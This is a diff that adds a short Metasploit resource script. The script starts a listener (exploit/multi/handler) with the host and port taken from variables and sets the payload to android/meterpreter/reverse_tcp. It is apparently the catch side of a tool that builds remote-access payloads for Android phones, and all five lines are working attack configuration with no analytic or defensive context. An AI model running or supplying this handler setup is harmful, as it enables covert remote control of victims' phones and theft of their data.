@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set LPORT $b
+set LHOST $a                                                                                                                                           
+set payload android/meterpreter/reverse_tcp
+exploit
